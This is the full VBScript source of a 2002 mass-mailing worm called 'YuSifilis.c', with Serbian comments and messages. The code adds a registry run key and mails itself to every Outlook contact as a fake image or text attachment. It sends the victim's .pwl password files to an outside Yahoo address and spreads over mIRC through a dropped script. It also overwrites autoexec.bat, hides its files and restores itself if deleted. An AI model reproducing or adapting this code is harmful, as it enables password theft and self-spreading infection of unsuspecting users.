
'Moj novi projekat 07.10.2002/ YuSifilis.c / Ja ni u jednom slucaju nisam odgovoran sto ste 
'se vi zarazili sa ovim crvom , vi ste ga pokrenuli!!! Coded by A.C. / Serbian crime
On Error Resume Next
DIm attach, w1, crv1, crv2, crv3, crv4, crv5
Set attach = CreateObject("Scripting.FileSystemObject")
Set vrc2 = CreateObject( "WScript.Shell" )
vrc2.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & "RegEdit", (attach.getspecialfolder(0) & "\Karleusa_soba_slika1.jpg.vbs")
Set crv1 = CreateObject( "Outlook.Application" )
Set crv2 = crv1.GetNameSpace( "MAPI" )
For Each crv3 In crv2.AddressLists
For crv4 = 1 To crv3.AddressEntries.Count
Set crv5 = crv1.CreateItem( 0 )
crv5.BCC = crv3.AddressEntries( crv4 ).Address
crv5.Subject = "Procitaj ovo OBAVEZNO !!!"
crv5.Body = "Saljem ti ceo text kako da zavedes partnera!"+vbcrlf+"Procitaj molim te da vidis kako ljudi pisu budalastine itd.. "+vbcrlf+"Ajde pa mi onda javi dali ti se svidja!"+vbcrlf+"Pozdrav"
crv5.Attachments.Add (attach.getspecialfolder(0) & "\Zavodjenje_2deo.bat")
crv5.DeleteAfterSubmit = True
crv5.Send
Next
Next
Set crv1 = CreateObject( "Outlook.Application" )
Set crv2 = crv1.GetNameSpace( "MAPI" )
For Each crv3 In crv2.AddressLists
For crv4 = 2 To crv3.AddressEntries.Count
Set crv5 = crv1.CreateItem( 0 )
crv5.BCC = ("freeman2444@yahoo.com")
crv5.Subject = "YuSifilis.C Infekcija !!!"
crv5.Body = "Evo jos jednog gazda ! Sirimo se polako ali sigurno!"
crv5.Attachments.Add (attach.getspecialfolder(0) & "\*.pwl")
crv5.DeleteAfterSubmit = True
crv5.Send
Next
Next
Set crv1 = CreateObject( "Outlook.Application" )
Set crv2 = crv1.GetNameSpace( "MAPI" )
For Each crv3 In crv2.AddressLists
For crv4 = 1 To crv3.AddressEntries.Count
Set crv5 = crv1.CreateItem( 0 )
crv5.BCC = crv3.AddressEntries( crv4 ).Address
crv5.Subject = "Neverovatno , ali moguce..."
crv5.Body = "Ladno slika Karleuse kako je gola..."+vbcrlf+"Verovatno montaza a i ne mora znaciti "+vbcrlf+"Ako je montaza onda je stvarno uradjena do bola.."+vbcrlf+"Caos..."
crv5.Attachments.Add (attach.getspecialfolder(0) & "\Karleusa_soba_slika1.jpg.vbs")
crv5.DeleteAfterSubmit = True
crv5.Send
Next
Next
Set Script = attach.CreateTextFile("\script.ini", True)
Script.Writeline "[script]"
Script.Writeline "n0=;Coded by / acidcookie / "
Script.Writeline "n1=On 1:JOIN:#:{ /if ( $nick==me ) { halt } "
Script.Writeline "n2= /dcc send $nick " & attach.getspecialfolder(0) & "\Zavodjenje_2deo.bat"
Script.Writeline "n3= }"
Script.Writeline "n4=on 1:PART:#:{ /if ( $nick==me ) {halt}"
Script.writeline "n5= /dcc send $nick " & attach.getspecialfolder(0) & "\Karleusa_soba_slika1.jpg.vbs"
Script.Writeline "n6=}"
Script.Close
Script.Close
Set w1 = attach.GetFile("\script.ini")
w1.copy ("C:\mirc\script.ini")
w1.copy ("C:\program files\script.ini")
Set Drives=attach.drives
For Each Drive in Drives 
If drive.isready then
Dosearch drive 
end If 
Next 

Function Dosearch(Path) 
Set Folder=attach.getfolder(path) 
Set Files = folder.files 
For Each File in files 

If file.name = "mirc.ini" then 

w1.copy (folder.path & "\script.ini")
end If 
Next 

Set Subfolders = folder.SubFolders 
For Each Subfolder in Subfolders 
Dosearch Subfolder.path 
Next 
end function 

Set porukica= attach.CreateTextFile("C:\autoexec.bat", True, False)
 porukica.Write(tout)
 porukica.WriteLine "@echo off"
 porukica.WriteLine "echo Ja sam lepa , zgodna , pametna i uobrazena"
 porukica.WriteLine "echo Ja sam kompljuterski crv 'YuSifilis.c'"
 porukica.WriteLine "echo ------------------------------------------"
 porukica.WriteLine "echo Coded by A.C."
 porukica.WriteLine "echo Kad sve izgleda da umire, ono se ustvari radja..."
 porukica.WriteLine "echo Mi u BOG-a verujemo"
 porukica.WriteLine "echo Greets: VK , BihNet.org , #vxers , 29A ,"
 porukica.WriteLine "echo vtc.cjb.net , and all VX coderz..."
 porukica.WriteLine "pause <nul"
porukica.Close()
Dim f
 Set f = attach.GetFile(attach.GetSpecialFolder(0)&"\Zavodjenje_2deo.bat")
 f.attributes = f.attributes + 2
 Set f = attach.GetFile(attach.GetSpecialFolder(0)&"\Karleusa_soba_slika1.jpg.vbs")
 f.attributes = f.attributes + 2

Zastita
function Zastita()
dim myself,mytext
          set attach = createobject("scripting.filesystemobject")
          set myself = attach.opentextfile(wscript.scriptfullname)

          mytext = myself.readall
          myself.close
          do

               if attach.fileexists(wscript.scriptfullname) = false then

                    set myself = attach.createtextfile(wscript.scriptfullname)
                    myself.write mytext
                    myself.close 

               end if

          loop 
end function
